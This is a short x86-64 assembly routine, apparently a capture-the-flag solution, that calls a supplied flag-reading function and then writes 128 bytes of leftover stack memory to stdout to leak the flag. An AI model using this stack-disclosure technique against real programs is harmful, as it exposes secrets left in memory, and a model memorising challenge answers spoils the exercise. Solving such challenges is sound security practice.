.intel_syntax noprefix
.global solve

solve:
  # Save the function pointer
  push rdi 

  # Call the read_flag func 
  call rdi

  pop rdi 

  # Prep for write syscall read from stack 
  mov rax, 1      # syscall write
  mov rdi, 1      # fd
  mov rsi, rsp    # Start reading from rsp
  sub rsi, 0x88   # Adjust offset  
  mov rdx, 128     # Read 128 bytes 
  syscall
          
  ret 


